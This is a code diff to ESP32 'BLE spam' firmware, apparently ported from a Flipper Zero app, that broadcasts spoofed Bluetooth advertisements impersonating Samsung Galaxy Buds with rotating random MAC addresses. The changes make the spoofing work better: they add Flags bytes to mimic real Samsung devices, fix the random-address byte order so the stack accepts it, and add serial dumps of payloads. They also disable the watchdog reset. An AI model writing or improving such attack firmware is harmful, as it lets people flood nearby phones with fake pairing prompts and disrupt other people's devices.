@@ -1089,7 +1089,13 @@ static void bleSpamApplyTxPower(BleSpamTxPower level) {
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, bleSpamTxPowerToLevel(level));
 }
 
-static void bleSpamSetMac(const uint8_t *mac) { esp_iface_mac_addr_set(mac, ESP_MAC_BT); }
+static void bleSpamSetMac(const uint8_t *mac) {
+    esp_iface_mac_addr_set(mac, ESP_MAC_BT);
+    Serial.printf(
+        "[BLESPAM] setMac (public) %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4],
+        mac[5]
+    );
+}
 
 static uint64_t bleSpamMacRngState = 0;
 
@@ -1271,6 +1277,10 @@ static bool bleSpamBuildAdvertisementData(
                 uint32_t model = samsung_buds_models[random(samsung_buds_count)];
                 uint8_t Buds_Data[31];
                 uint8_t bi = 0;
+                // Flags AD (LE General Discoverable + BR/EDR), like real Samsung devices
+                Buds_Data[bi++] = 0x02;
+                Buds_Data[bi++] = 0x01;
+                Buds_Data[bi++] = 0x1A;
                 Buds_Data[bi++] = 27;
                 Buds_Data[bi++] = 0xFF;
                 Buds_Data[bi++] = 0x75;
@@ -1299,13 +1309,6 @@ static bool bleSpamBuildAdvertisementData(
                 Buds_Data[bi++] = 0x00;
                 Buds_Data[bi++] = 0xC7;
                 Buds_Data[bi++] = 0x00;
-                // Trailing truncated record (length=0x10 claimed, only 2 data
-                // bytes present) — ported from the Flipper Zero ble_spam app.
-                // Real Galaxy Buds advertise this stub second record; without
-                // it Samsung's scanner doesn't recognize the packet.
-                Buds_Data[bi++] = 0x10;
-                Buds_Data[bi++] = 0xFF;
-                Buds_Data[bi++] = 0x75;
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(Buds_Data, bi);
 #else
@@ -1486,17 +1489,21 @@ bleSpamRestartAdvertiserForMac(BleSpamRunState &state, const BleSpamConfig &conf
 
 #ifdef CONFIG_BT_NIMBLE_ENABLED
     // NimBLE keeps its own copy of the random address in the host layer.
-    // ble_hs_id_set_rnd expects bytes in little-endian order (byte 0 = LSB of address).
-    // A valid random static address requires the two MSBs of the *most significant byte*
-    // (which is byte[5] in big-endian / byte[0] in little-endian) to be set to 11.
+    // ble_hs_id_set_rnd expects bytes in little-endian order (byte 0 = LSB of address,
+    // byte 5 = MSB). A valid random static address requires the two MSBs of the most
+    // significant byte (byte[5]) to be 11, and ble_hs_id_set_rnd validates rnd_addr[5].
     uint8_t addr_le[6];
-    addr_le[0] = mac[5] | 0xC0; // MSB of address with random static bits set
+    addr_le[0] = mac[5];
     addr_le[1] = mac[4];
     addr_le[2] = mac[3];
     addr_le[3] = mac[2];
     addr_le[4] = mac[1];
-    addr_le[5] = mac[0];
-    ble_hs_id_set_rnd(addr_le);
+    addr_le[5] = mac[0] | 0xC0; // MSB: static random address (top 2 bits = 11)
+    int _rc = ble_hs_id_set_rnd(addr_le);
+    Serial.printf(
+        "[BLESPAM] set_rnd rc=%d addr=%02X:%02X:%02X:%02X:%02X:%02X\n", _rc, addr_le[5], addr_le[4],
+        addr_le[3], addr_le[2], addr_le[1], addr_le[0]
+    );
     NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
 #else
     // Bluedroid: the GAP API handles the random address directly.
@@ -1545,6 +1552,15 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
         const BLEAdvertisementData *advertisementData =
             bleSpamSelectAdvertisement(state, attackType, deviceIndex);
         if (!advertisementData) return;
+
+        static uint32_t _lastDump = 0;
+        if (now - _lastDump > 500) {
+            _lastDump = now;
+            std::vector<uint8_t> _pl = advertisementData->getPayload();
+            Serial.printf("[BLESPAM] adv len=%u: ", (unsigned)_pl.size());
+            for (uint8_t _b : _pl) Serial.printf("%02X ", _b);
+            Serial.println();
+        }
 
         pAdvertising->setAdvertisementData(*advertisementData);
         pAdvertising->setScanResponseData(emptyScanResponse);
@@ -1854,7 +1870,7 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
         while (running) {
             bleSpamSendTick(runState, config, selection);
             bleSpamUpdateStats(runState);
-            esp_task_wdt_reset(); // CHANGED: feed watchdog to prevent WDT crash at tight intervals
+            // esp_task_wdt_reset(); // temp off for clean debug (task not subscribed to TWDT anyway)
 
             uint32_t now = millis();
             if (now - lastStatsUpdate >= BLE_SPAM_STATS_UPDATE_MS) {
